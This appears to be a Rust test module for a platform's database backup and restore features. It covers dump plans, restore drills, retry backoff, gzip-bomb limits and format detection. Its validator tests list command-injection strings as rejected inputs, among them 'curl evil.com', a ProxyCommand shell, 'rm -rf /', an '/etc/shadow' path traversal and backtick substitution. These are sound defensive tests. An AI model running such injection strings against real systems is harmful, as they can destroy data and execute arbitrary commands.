        let compressed = DumpFile::from_bytes(&gzip(&content).await.unwrap(), &tmp)
            .await
            .unwrap();
        let restored = DumpFile::gunzip(&compressed.path, &tmp).await.unwrap();
        assert_eq!(tokio::fs::read(&restored.path).await.unwrap(), content);
    }

    /// A backup from S3 is outside input: a gzip bomb must stop before the disk keeps less than
    /// its reserve, not fill the disk. The reserve here leaves room for 8 MiB, and the bomb
    /// holds 64 MiB of zeros in a few KiB.
    #[tokio::test]
    async fn a_gzip_bomb_stops_at_the_reserve_of_the_disk() -> anyhow::Result<()> {
        let tmp = std::env::temp_dir();
        let zeros = vec![0u8; 64 * 1024 * 1024];
        let bomb = DumpFile::from_bytes(&gzip(&zeros).await?, &tmp).await?;
        let free = super::super::prune::get_disk_space(&tmp)
            .context("the free space of the temp dir")?
            .available_bytes;
        let mut room =
            super::super::transfer::DiskRoom::with_reserve(&tmp, free - 8 * 1024 * 1024)?;
        let out = DumpFile::new(&tmp).await?;
        let err = ungzip_file_within(&bomb.path, &out.path, &mut room)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("would keep less than"), "{err}");
        let written = tokio::fs::metadata(&out.path).await?.len();
        assert!(
            written <= 8 * 1024 * 1024,
            "{written} bytes reached the disk"
        );
        Ok(())
    }

    #[tokio::test]
    async fn set_backup_config_atomic_updates_succeed() -> anyhow::Result<()> {
        let (platform, _dir) = crate::platform::tests::platform().await?;

        let s3 = Some(r3v3rs3_api::platform::S3Config {
            endpoint: "https://s3.example.com/b".into(),
            region: "us-east-1".into(),
            prefix: "db".into(),
            access_key: "AKIA".into(),
            secret_key: "secret_s3_key".into(),
        });
        let config = BackupConfig {
            s3,
            ..Default::default()
        };

        platform.set_backup_config(config).await?;

        let loaded = platform.backup_config().await?;
        assert!(loaded.s3.is_some());
        assert_eq!(loaded.s3.as_ref().unwrap().access_key, "AKIA");
        assert_eq!(
            platform.s3_secret().await?.as_deref(),
            Some("secret_s3_key")
        );

        Ok(())
    }

    /// The tenants of a shared PostgreSQL server live in databases of their own, so a backup
    /// of the server must hold every database, and no role password that a restore could bring
    /// back over the stored one.
    #[test]
    fn postgres_dumps_every_database_without_role_passwords() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("postgres").unwrap();
        let plan = dump_plan("postgres", &info, "pass").unwrap();
        assert_eq!(plan.command[0], "pg_dumpall");
        assert!(plan.command.iter().any(|arg| arg == "--no-role-passwords"));
        assert!(plan.command.iter().any(|arg| arg == "--clean"));
        assert!(!plan.command.iter().any(|arg| arg == "pass"));
        assert_eq!(plan.env, ["PGPASSWORD=pass"]);
        assert!(plan.file.is_none());
    }

    /// A restore into a running server must end the connections of the databases it replaces,
    /// keep the root role of its own session and stop at the first error instead of reporting
    /// success over a half-restored server.
    /// The adapted plan and script of a dump with the given content.
    async fn adapt(plan: &RestorePlan, dump: &[u8]) -> Option<(RestorePlan, Vec<u8>)> {
        let dump = DumpFile::from_bytes(dump, &std::env::temp_dir())
            .await
            .unwrap();
        let (plan, script) = adapt_postgres_cluster_dump(plan, &dump).await.unwrap()?;
        Some((plan, tokio::fs::read(&script.path).await.unwrap()))
    }

    #[tokio::test]
    async fn a_postgres_cluster_dump_restores_over_open_connections_and_stops_on_error() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("postgres").unwrap();
        let plan = restore_plan("postgres", &info, "pass").unwrap();
        let dump = b"--\n-- PostgreSQL database cluster dump\n--\n\nDROP DATABASE IF EXISTS p_shop;\nDROP ROLE IF EXISTS p_shop;\nDROP ROLE IF EXISTS postgres;\nCREATE ROLE p_shop;\nCREATE ROLE postgres;\n\\connect template1\nDROP DATABASE postgres;\n";
        let (adapted, script) = adapt(&plan, dump).await.unwrap();
        let script = String::from_utf8(script).unwrap();
        assert!(script.contains("DROP DATABASE IF EXISTS p_shop WITH (FORCE);"));
        assert!(script.contains("DROP DATABASE postgres WITH (FORCE);"));
        assert!(script.contains("DROP ROLE IF EXISTS p_shop;"));
        assert!(script.contains("CREATE ROLE p_shop;"));
        assert!(!script.contains("ROLE IF EXISTS postgres;"));
        assert!(!script.contains("CREATE ROLE postgres;"));
        assert!(
            adapted
                .command
                .windows(2)
                .any(|w| w == ["-v", "ON_ERROR_STOP=1"])
        );
        assert_eq!(adapted.upload, plan.upload);
    }

    /// The rows of a table are user data: a row that reads like a statement of the dump and a
    /// byte that is not UTF-8 reach the restore exactly as the dump holds them.
    #[tokio::test]
    async fn a_postgres_cluster_dump_keeps_table_rows_byte_for_byte() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("postgres").unwrap();
        let plan = restore_plan("postgres", &info, "pass").unwrap();
        let rows: &[u8] = b"CREATE ROLE postgres;\nDROP DATABASE shop;\nlatin1 \xe9 byte\n\\.\n";
        let mut dump =
            b"--\n-- PostgreSQL database cluster dump\n--\n\nCOPY public.t (x) FROM stdin;\n"
                .to_vec();
        dump.extend_from_slice(rows);
        dump.extend_from_slice(b"DROP DATABASE shop;\n");
        let (_, script) = adapt(&plan, &dump).await.unwrap();
        let copy = b"COPY public.t (x) FROM stdin;\n";
        let start = script.windows(copy.len()).position(|w| w == copy).unwrap() + copy.len();
        assert_eq!(&script[start..start + rows.len()], rows);
        assert!(script.ends_with(b"DROP DATABASE shop WITH (FORCE);\n"));
    }

    /// The backups taken before the cluster dump hold one database; they restore as before.
    #[tokio::test]
    async fn a_single_database_dump_restores_unchanged() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("postgres").unwrap();
        let plan = restore_plan("postgres", &info, "pass").unwrap();
        let dump = b"--\n-- PostgreSQL database dump\n--\n\nCREATE TABLE public.t (x integer);\n";
        assert!(adapt(&plan, dump).await.is_none());
        let mysql = restore_plan("mysql", &info, "pass").unwrap();
        assert!(
            adapt(&mysql, b"-- PostgreSQL database cluster dump")
                .await
                .is_none()
        );
    }

    /// A restore that keeps failing until its deadline must say why it failed: an operator
    /// cannot act on a bare timeout, for example when the dump is rejected every time.
    #[tokio::test]
    async fn a_restore_that_never_succeeds_reports_its_last_error() {
        let attempts = std::sync::atomic::AtomicU32::new(0);
        let result = retry_until(
            Duration::from_millis(50),
            Duration::from_millis(5),
            || async {
                let attempt = attempts.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                anyhow::bail!("dump rejected on attempt {attempt}")
            },
        )
        .await;
        let message = format!("{:#}", result.unwrap_err());
        assert!(message.contains("dump rejected on attempt"), "{message}");
        assert!(attempts.load(std::sync::atomic::Ordering::SeqCst) > 1);
        let done = retry_until(
            Duration::from_millis(50),
            Duration::from_millis(5),
            || async { anyhow::Ok(()) },
        );
        assert!(done.await.is_ok());
    }

    /// Two servers on one data directory corrupt it: a point-in-time branch must mount a volume
    /// of its own, named like the volume of every new database, and must not stay a replica.
    #[test]
    fn a_pitr_branch_gets_its_own_data_volume() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("postgres").unwrap();
        let source_name: AppName = "shop-db".parse().unwrap();
        let mut source =
            create_database_spec(&source_name, "postgres", "postgres:17-alpine", &info, 5432)
                .unwrap();
        source.replica_of = Some("abc-def".parse().unwrap());
        let branch_name: AppName = "shop-db-branch".parse().unwrap();
        let branch = branch_spec(&source, &branch_name, 5440).unwrap();
        assert_eq!(branch.volumes.len(), 1);
        assert_eq!(branch.volumes[0].volume.as_str(), "shop-db-branch-data");
        assert_ne!(branch.volumes[0].volume, source.volumes[0].volume);
        assert_eq!(branch.volumes[0].target.as_str(), info.data_path);
        assert_eq!(branch.host_port, Some(5440));
        assert!(branch.replica_of.is_none());
        assert_eq!(branch.database, source.database);
    }

    /// The `mysql` schema holds every account with its password hash; a restore of it would
    /// bring back old passwords over the stored ones, so the dump leaves the system schemas out
    /// and still takes every other database.
    #[test]
    fn mysql_dumps_leave_the_account_schema_out() {
        catalog();
        for engine in ["mysql", "mariadb"] {
            let info = r3v3rs3_api::platform::engine_info(engine).unwrap();
            let plan = dump_plan(engine, &info, "pass").unwrap();
            let script = &plan.command[2];
            assert!(!script.contains("--all-databases"), "{engine}");
            assert!(script.contains("NOT IN ('mysql', 'sys',"), "{engine}");
            assert!(script.contains("--databases $dbs"), "{engine}");
            assert!(!plan.command.iter().any(|arg| arg.contains("pass")));
            assert_eq!(plan.env, ["MYSQL_PWD=pass"]);
        }
    }

    /// A restore runs into the live server, which has executed transactions of its own; MySQL
    /// refuses to set the GTID set of a dump over them, so the dump must not carry one.
    #[test]
    fn a_mysql_dump_carries_no_gtid_set() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("mysql").unwrap();
        let plan = dump_plan("mysql", &info, "pass").unwrap();
        assert!(plan.command[2].contains("--set-gtid-purged=OFF"));
    }

    #[test]
    fn mongodb_dumps_and_restores_without_plaintext_password_in_command() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("mongodb").unwrap();
        let secret = "super:secret@pass";
        let dump = dump_plan("mongodb", &info, secret).unwrap();
        assert_eq!(
            dump.command,
            ["sh", "-c", "mongodump --uri=\"$MONGO_URI\" --archive"]
        );
        assert!(!dump.command.iter().any(|arg| arg.contains(secret)));
        assert_eq!(
            dump.env,
            [format!(
                "MONGO_URI={}",
                mongodb_uri(&info.user, secret).unwrap()
            )]
        );

        // The accounts live in the `admin` database; a restore must not bring back their old
        // passwords over the stored ones.
        let restore = restore_plan("mongodb", &info, secret).unwrap();
        assert!(restore.command[2].starts_with(
            "mongorestore --uri=\"$MONGO_URI\" --archive=/tmp/r3v3rs3-restore/dump.archive --drop"
        ));
        assert!(restore.command[2].contains("--nsExclude='admin.*'"));
        assert!(!restore.command.iter().any(|arg| arg.contains(secret)));
        assert_eq!(
            restore.env,
            [format!(
                "MONGO_URI={}",
                mongodb_uri(&info.user, secret).unwrap()
            )]
        );
    }

    #[test]
    fn redis_downloads_its_dump_file_instead() {
        catalog();
        let info = r3v3rs3_api::platform::engine_info("redis").unwrap();
        let plan = dump_plan("redis", &info, "").unwrap();
        assert_eq!(plan.command, ["redis-cli", "SAVE"]);
        assert_eq!(plan.file.as_deref(), Some("/data/dump.rdb"));

        let plan = restore_plan("redis", &info, "").unwrap();
        assert!(plan.upload.is_none());
    }

    #[test]
    fn every_dump_engine_has_a_restore_that_undoes_it() {
        catalog();
        for engine in ["postgres", "mariadb", "mysql", "mongodb"] {
            let info = r3v3rs3_api::platform::engine_info(engine).unwrap();
            let restore = restore_plan(engine, &info, "pass").unwrap();
            assert!(restore.upload.is_some(), "{engine} has no upload");
            assert!(!restore.command.is_empty());
        }
    }

    #[test]
    fn dump_formats_are_detected_from_content_magic() {
        assert_eq!(detect_dump_format("redis", b"REDIS0009\xff"), "redis_rdb");
        assert_eq!(
            detect_dump_format("postgres", b"-- PostgreSQL database dump"),
            "postgres_dump"
        );
        assert_eq!(
            detect_dump_format("mysql", b"-- MySQL dump 10.13"),
            "mysql_dump"
        );
        assert_eq!(
            detect_dump_format("sqlite", b"SQLite format 3\0\x10"),
            "sqlite3"
        );
        assert_eq!(detect_dump_format("generic", b""), "empty");
    }

    /// A recovery from dumps alone reaches only the moments of the dumps, not any second: an
    /// engine without a log archive, such as one a later catalog adds, is refused with its name
    /// and gets no segment, instead of a recovery to a state it never had at the target.
    #[tokio::test]
    async fn an_engine_without_a_log_archive_offers_no_recovery() {
        let (command, _) = tokio::sync::mpsc::channel(1);
        let config = r3v3rs3_api::platform::PlatformConfig::default();
        let (platform, _fake, _dir) = super::super::tests::platform_with(&config, command)
            .await
            .unwrap();
        let platform = Arc::new(platform);
        // A stored database of an engine that no log archive covers; the catalog check of a new
        // app would refuse an engine it does not list, so the record goes into the store.
        let mut app = platform
            .add_app(super::super::tests::request("cache"), 1)
            .await
            .unwrap();
        app.spec.database = Some("keydb".into());
        platform.store.update_app(&app).await.unwrap();
        let unsupported = |err: anyhow::Error| {
            matches!(
                err.downcast_ref::<Error>(),
                Some(Error::PitrUnsupported { engine }) if engine == "keydb"
            )
        };
        assert!(unsupported(platform.archive_wal(app.id).await.unwrap_err()));
        assert!(unsupported(platform.pitr_range(app.id).await.unwrap_err()));
        let request = PitrRestoreRequest {
            target_time: 1,
            new_name: None,
            host_port: None,
        };
        let restore = platform.restore_pitr(app.id, request).await;
        assert!(unsupported(restore.unwrap_err()));
        assert!(platform.list_wal_segments(app.id).await.unwrap().is_empty());
    }

    #[test]
    fn parses_s3_backup_snapshot_key() {
        let snap = parse_backup_snapshot(
            "databases",
            "databases/shop/1a2b.dump.gz",
            1024,
            "2026-10-21T18:00:00Z",
        )
        .unwrap();
        assert_eq!(snap.database_name, "shop");
        assert_eq!(snap.backup_id, "1a2b");
        assert_eq!(snap.size, 1024);

        let snap_noprefix =
            parse_backup_snapshot("", "users/snap99.sql.gz", 2048, "2026-10-21T19:00:00Z").unwrap();
        assert_eq!(snap_noprefix.database_name, "users");
        assert_eq!(snap_noprefix.backup_id, "snap99");

        // Non-backup dump files are ignored
        assert!(parse_backup_snapshot("databases", "databases/shop/1a2b.json", 100, "").is_none());
        assert!(
            parse_backup_snapshot("databases", "disaster-recovery/123.r3bundle", 100, "").is_none()
        );
    }

    #[test]
    fn backup_config_heartbeat_url_roundtrip() {
        let json = r#"{"schedule":"03:00","keep":14,"heartbeat_url":"https://hc-ping.com/123"}"#;
        let config: BackupConfig = serde_json::from_str(json).unwrap();
        assert_eq!(config.schedule, "03:00");
        assert_eq!(config.keep, 14);
        assert_eq!(
            config.heartbeat_url.as_deref(),
            Some("https://hc-ping.com/123")
        );
    }

    #[test]
    fn extract_sql_table_name_handles_various_syntaxes() {
        assert_eq!(
            extract_sql_table_name("CREATE TABLE users (id int);").as_deref(),
            Some("users")
        );
        assert_eq!(
            extract_sql_table_name("create table if not exists public.\"orders\" (id int);")
                .as_deref(),
            Some("orders")
        );
        assert_eq!(
            extract_sql_table_name("CREATE TABLE `mydb`.`sessions` (").as_deref(),
            Some("sessions")
        );
        assert_eq!(
            extract_sql_table_name("CREATE OR REPLACE TABLE logs (").as_deref(),
            Some("logs")
        );
        assert_eq!(extract_sql_table_name("SELECT * FROM users;"), None);
    }

    #[test]
    fn simulate_restore_drill_postgresql_with_tables_and_data() {
        let dump = b"-- PostgreSQL database dump\n\
                     CREATE TABLE public.users (\n  id int\n);\n\
                     COPY public.users (id) FROM stdin;\n1\n\\.\n\
                     CREATE TABLE public.orders (\n  id int\n);\n\
                     INSERT INTO public.orders VALUES (1);\n\
                     -- PostgreSQL database dump complete\n";
        let started = std::time::Instant::now();
        let drill = simulate_restore_drill("postgres", dump, started);
        assert!(drill.integrity_check_passed);
        assert_eq!(drill.drill_mode, "postgres_schema_drill");
        assert_eq!(drill.table_count, 2);
        assert_eq!(drill.tables_sample, vec!["users", "orders"]);
        assert!(drill.has_data);
        assert_eq!(drill.schema_objects_count, 4);
    }

    #[test]
    fn simulate_restore_drill_redis_rdb() {
        let mut rdb = b"REDIS0009\xfa\x09redis-ver\x057.2.4\xff".to_vec();
        rdb.extend_from_slice(&[0u8; 8]); // 8-byte checksum
        let started = std::time::Instant::now();
        let drill = simulate_restore_drill("redis", &rdb, started);
        assert!(drill.integrity_check_passed);
        assert_eq!(drill.drill_mode, "redis_rdb_drill");
        assert_eq!(drill.table_count, 1);
        assert_eq!(drill.tables_sample, vec!["keyspace_0"]);
        assert!(drill.has_data);
    }

    #[test]
    fn simulate_restore_drill_sqlite_binary() {
        let mut header = b"SQLite format 3\0".to_vec();
        header.extend_from_slice(&[0x10, 0x00]); // 4096 page size
        header.resize(100, 0);
        let started = std::time::Instant::now();
        let drill = simulate_restore_drill("sqlite", &header, started);
        assert!(drill.integrity_check_passed);
        assert_eq!(drill.drill_mode, "sqlite_file_drill");
        assert_eq!(drill.table_count, 1);
    }

    #[test]
    fn simulate_restore_drill_detects_corrupt_payload() {
        let corrupt = b"random broken garbage bytes without any valid headers";
        let started = std::time::Instant::now();
        let drill = simulate_restore_drill("postgres", corrupt, started);
        assert!(!drill.integrity_check_passed);
        assert_eq!(drill.table_count, 0);
        assert!(!drill.has_data);
    }

    #[tokio::test]
    async fn test_source_and_target_wal_dirs_are_distinct() {
        let (platform, _dir) = crate::platform::tests::platform().await.unwrap();
        let source_app = platform
            .add_app(crate::platform::tests::request("shop-db"), 1)
            .await
            .unwrap();
        let target_app = platform
            .add_app(crate::platform::tests::request("shop-clone"), 2)
            .await
            .unwrap();
        let source_wal = platform.wal_dir(source_app.id).await.unwrap();
        let target_wal = platform.wal_dir(target_app.id).await.unwrap();
        assert_ne!(source_wal, target_wal);
        assert!(source_wal.ends_with("shop-db/wal"));
        assert!(target_wal.ends_with("shop-clone/wal"));
    }

    /// A stopped database changes nothing and its container cannot run a dump, so its due
    /// backup is not tried: no failure starts a retry wait. A running one is tried.
    #[tokio::test]
    async fn a_stopped_database_skips_its_scheduled_backup() -> anyhow::Result<()> {
        let (platform, _dir) = crate::platform::tests::platform().await?;
        let request = crate::platform::tests::request("shop-db");
        let mut db = platform.add_app(request, 1).await?;
        // The engine catalog is not installed in the test, so the spec goes in directly.
        db.spec.database = Some("postgres".into());
        platform.store.update_app(&db).await?;
        let slot = 1_000_000_000i64;
        platform.store.set_app_stopped(db.id, true).await?;
        check_due_backup(&platform, db.id, slot).await?;
        assert!(
            platform.is_backup_due(db.id, slot, slot),
            "the backup was tried"
        );

        platform.store.set_app_stopped(db.id, false).await?;
        check_due_backup(&platform, db.id, slot).await?;
        assert!(
            !platform.is_backup_due(db.id, slot, slot),
            "the backup was not tried"
        );
        Ok(())
    }

    /// Runs the scheduled backup check of the database at the start of its due slot.
    async fn check_due_backup(platform: &Platform, id: ShortId, slot: i64) -> anyhow::Result<()> {
        let config = platform.backup_config().await?;
        let app = platform.app(id).await?;
        platform.check_app_backup(&app, slot, slot, &config).await
    }

    #[tokio::test]
    async fn test_scheduled_backup_retry_backoff_and_limit() {
        let (platform, _dir) = crate::platform::tests::platform().await.unwrap();
        let app = platform
            .add_app(crate::platform::tests::request("retry-db"), 1)
            .await
            .unwrap();
        let slot = 1_000_000_000i64;

        // Initially due
        assert!(platform.is_backup_due(app.id, slot, slot));

        // 1st failure: 1 min backoff
        platform.record_backup_failure(app.id, slot, slot);
        assert!(!platform.is_backup_due(app.id, slot, slot + 30_000));
        assert!(platform.is_backup_due(app.id, slot, slot + 60_000));

        // 2nd failure: 5 min backoff
        let t1 = slot + 60_000;
        platform.record_backup_failure(app.id, slot, t1);
        assert!(!platform.is_backup_due(app.id, slot, t1 + 60_000));
        assert!(platform.is_backup_due(app.id, slot, t1 + 300_000));

        // 3rd failure: limit reached (3 attempts max)
        let t2 = t1 + 300_000;
        platform.record_backup_failure(app.id, slot, t2);
        assert!(!platform.is_backup_due(app.id, slot, t2 + 10_000_000));

        // Tomorrow's slot resets retry tracking
        let next_slot = slot + 86_400_000;
        assert!(platform.is_backup_due(app.id, next_slot, next_slot));

        // Success clears failure record
        platform.record_backup_success(app.id);
        assert!(platform.is_backup_due(app.id, slot, slot));
    }

    #[tokio::test]
    async fn test_streaming_backup_and_verification() {
        let temp = crate::platform::tests::TempDir(
            std::env::temp_dir().join(format!("r3v3rs3-test-{}", ShortId::new())),
        );
        tokio::fs::create_dir_all(&temp.0).await.unwrap();
        let dump_path = temp.0.join("test.dump.gz");

        let postgres_dump = b"-- PostgreSQL database dump\n\
                             CREATE TABLE users (id int);\n\
                             INSERT INTO users VALUES (1);\n\
                             -- PostgreSQL database dump complete\n";

        let plain = DumpFile::from_bytes(postgres_dump, &temp.0).await.unwrap();
        let (size, sha256) = super::super::transfer::gzip_file(&plain.path, &dump_path)
            .await
            .unwrap();
        assert!(size > 0);
        assert!(!sha256.is_empty());

        let file_sha = compute_file_sha256(&dump_path).await.unwrap();
        assert_eq!(sha256, file_sha);

        let started = std::time::Instant::now();
        let (drill, uncompressed_size) = stream_verify_drill("postgres", &dump_path, started)
            .await
            .unwrap();

        assert!(drill.integrity_check_passed);
        assert_eq!(drill.drill_mode, "postgres_schema_drill");
        assert_eq!(drill.table_count, 1);
        assert!(drill.has_data);
        assert_eq!(uncompressed_size, postgres_dump.len() as u64);
    }

    /// Verifies `bytes` as a stored backup of `engine` through the drill of
    /// `test_database_backup`.
    async fn drill_passes(engine: &str, bytes: &[u8]) -> bool {
        let dir = std::env::temp_dir().join(format!("r3v3rs3-drill-{:08x}", rand::random::<u32>()));
        tokio::fs::create_dir_all(&dir).await.unwrap();
        let path = dir.join("b.dump.gz");
        let plain = DumpFile::from_bytes(bytes, &dir).await.unwrap();
        super::super::transfer::gzip_file(&plain.path, &path)
            .await
            .unwrap();
        let started = std::time::Instant::now();
        let (drill, _) = stream_verify_drill(engine, &path, started).await.unwrap();
        tokio::fs::remove_dir_all(&dir).await.unwrap();
        drill.integrity_check_passed
    }

    /// The trailer of a complete dump (taken from pg_dumpall 17, pg_dump 17, mysqldump 8.4,
    /// mariadb-dump 11 and mongodump 100.x) proves that the dump ran to its end. A dump that a
    /// failed or killed run cut short has no trailer and cannot restore every database, so the
    /// verification must fail it; a complete dump of an empty server must pass.
    /// The check value of CRC-64/Jones from the test of `crc64.c` in Redis.
    #[test]
    fn the_rdb_checksum_matches_the_redis_check_value() {
        assert_eq!(crc64_jones(b"123456789"), 0xe9c6_d914_c4b8_d9ca);
    }

    #[tokio::test]
    async fn only_a_dump_that_ran_to_its_end_verifies() {
        let pg_head = "--\n-- PostgreSQL database cluster dump\n--\n\nSET default_transaction_read_only = off;\n";
        let pg_db = "--\n-- PostgreSQL database dump\n--\n\nCREATE TABLE public.a (i integer);\nCOPY public.a (i) FROM stdin;\n1\n\\.\n\n--\n-- PostgreSQL database dump complete\n--\n\n\\unrestrict AbC123\n\n";
        let pg_tail = "--\n-- PostgreSQL database cluster dump complete\n--\n\n";
        let complete = format!("{pg_head}{pg_db}{pg_tail}");
        assert!(drill_passes("postgres", complete.as_bytes()).await);
        assert!(drill_passes("postgres", pg_db.as_bytes()).await);
        assert!(!drill_passes("postgres", pg_head.as_bytes()).await);
        let cut_after_first_db = format!("{pg_head}{pg_db}");
        assert!(!drill_passes("postgres", cut_after_first_db.as_bytes()).await);

        let my = "-- MySQL dump 10.13\n/*!40101 SET NAMES utf8mb4 */;\nCREATE TABLE `a` (`i` int);\nINSERT INTO `a` VALUES (1);\n/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;\n\n-- Dump completed on 2026-11-17 16:49:42\n";
        assert!(drill_passes("mysql", my.as_bytes()).await);
        let cut = &my[..my.find("INSERT").unwrap() + 12];
        assert!(!drill_passes("mysql", cut.as_bytes()).await);
        assert!(drill_passes("mysql", b"-- MySQL dump: no user databases\n").await);
        assert!(drill_passes("mariadb", b"-- MariaDB dump: no user databases\n").await);

        let mut archive = vec![0x6d, 0xe2, 0x99, 0x81, 0x05, 0, 0, 0, 0x00];
        archive.extend_from_slice(&[0xff, 0xff, 0xff, 0xff]);
        assert!(drill_passes("mongodb", &archive).await);
        assert!(!drill_passes("mongodb", &archive[..9]).await);

        let mut rdb = b"REDIS0011\xfa\x09redis-ver\x057.4.1\xff".to_vec();
        rdb.extend_from_slice(&crc64_jones(&rdb).to_le_bytes());
        assert!(drill_passes("redis", &rdb).await);
        assert!(!drill_passes("redis", &rdb[..rdb.len() - 3]).await);
        assert!(!drill_passes("redis", b"REDIS0011\xfa\x09redis-ver").await);
    }

    #[test]
    fn test_validate_rsync_ssh_options_valid() {
        let valid = [
            "",
            "   ",
            "ssh -p 2222",
            "-p 22",
            "ssh -p 2222 -i /root/.ssh/id_rsa",
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10",
            "ssh -o BatchMode=yes",
            "-4 -p 2222 -q",
        ];
        for opt in valid {
            assert!(
                validate_rsync_ssh_options(opt).is_ok(),
                "should be valid: {opt}"
            );
        }
        assert_eq!(format_rsync_rsh("-p 2222").unwrap(), "ssh -p 2222");
        assert_eq!(format_rsync_rsh("ssh -p 2222").unwrap(), "ssh -p 2222");
    }

    #[test]
    fn test_validate_rsync_ssh_options_rejects_injections() {
        let invalid = [
            "bash -c 'id'",
            "sh -c 'curl evil.com'",
            "ssh -o ProxyCommand='bash -c id'",
            "ssh -o LocalCommand=id",
            "ssh -p 2222; rm -rf /",
            "ssh -p 2222 | cat",
            "ssh -p 2222 && whoami",
            "ssh -p 999999",
            "ssh -p 0",
            "ssh -i ../../../etc/shadow",
            "ssh -o DisallowedOption=123",
            "ssh `whoami`",
            "ssh $(whoami)",
        ];
        for opt in invalid {
            assert!(
                validate_rsync_ssh_options(opt).is_err(),
                "should be rejected: {opt}"
            );
        }
    }

    #[test]
    fn test_sanitize_sftp_path_valid() {
        let valid = ["/var/backups", "backups/db", "my_backup-1", "backups.prod"];
        for path in valid {
            assert!(
                sanitize_sftp_path_component(path).is_ok(),
                "should be valid: {path}"
            );
        }
        let batch = Platform::build_sftp_batch(
            "/backups",
            "mydb",
            std::path::Path::new("/tmp/dump.sql"),
            std::path::Path::new("/tmp/manifest.json"),
        )
        .unwrap();
        assert!(batch.contains("-mkdir \"/backups/mydb\""));
    }

    #[test]
    fn test_sanitize_sftp_path_rejects_injections() {
        let invalid = [
            "",
            "   ",
            "backup\n!id\n",
            "backup\r!whoami",
            "!sh",
            "\"/backups\"",
            "backup\\path",
            "backup;rm",
            "backup`id`",
            "backup$var",
        ];
        for path in invalid {
            assert!(
                sanitize_sftp_path_component(path).is_err(),
                "should be rejected: {path}"
            );
        }
    }

    #[test]
    fn test_validate_backup_engine_format_redis() {
        assert!(
            validate_backup_engine_format("redis", b"REDIS0009\xfa\tredis-ver\x057.0.0").is_ok()
        );
        assert!(
            validate_backup_engine_format("redis", b"-- PostgreSQL dump\nCREATE TABLE foo;")
                .is_err()
        );
        assert!(validate_backup_engine_format("redis", b"").is_err());
        assert!(validate_backup_engine_format("redis", b"\x00\x01\x02\x03").is_err());
    }

    #[test]
    fn test_validate_backup_engine_format_postgres() {
        assert!(
            validate_backup_engine_format(
                "postgres",
                b"-- PostgreSQL database dump\nSET statement_timeout = 0;"
            )
            .is_ok()
        );
        assert!(validate_backup_engine_format("postgres", b"PGDMP\x01\x02").is_ok());
        assert!(validate_backup_engine_format("postgres", b"REDIS0009\xfa").is_err());
        assert!(
            validate_backup_engine_format("postgres", b"-- MySQL dump 10.13\n/*!40101 SET")
                .is_err()
        );
    }

    #[test]
    fn test_validate_backup_engine_format_mysql_mongodb() {
        assert!(
            validate_backup_engine_format("mysql", b"-- MySQL dump 10.13\nCREATE DATABASE foo;")
                .is_ok()
        );
        assert!(validate_backup_engine_format("mysql", b"REDIS0009\xfa").is_err());
        assert!(validate_backup_engine_format("mysql", b"PGDMP\x01").is_err());
        assert!(validate_backup_engine_format("mysql", b"-- PostgreSQL database dump\n").is_err());
        assert!(validate_backup_engine_format("mongodb", b"\x16\x00\x00\x00\x02name\x00").is_ok());
        assert!(validate_backup_engine_format("mongodb", b"REDIS0009").is_err());
        assert!(validate_backup_engine_format("mongodb", b"-- PostgreSQL dump").is_err());
    }

    #[tokio::test]
    async fn test_prepare_sftp_key_mode_0600() {
        use std::os::unix::fs::PermissionsExt;
        // `prepare_sftp_key` treats any text with a `BEGIN ` marker as a key file.
        let dummy_key = "-----BEGIN TEST KEY-----\ndummy\n-----END TEST KEY-----";
        let key_path = Platform::prepare_sftp_key(dummy_key)
            .await
            .unwrap()
            .unwrap();
        let meta = std::fs::metadata(&key_path).unwrap();
        assert_eq!(meta.permissions().mode() & 0o777, 0o600);
        let _ = tokio::fs::remove_file(key_path).await;
    }
}
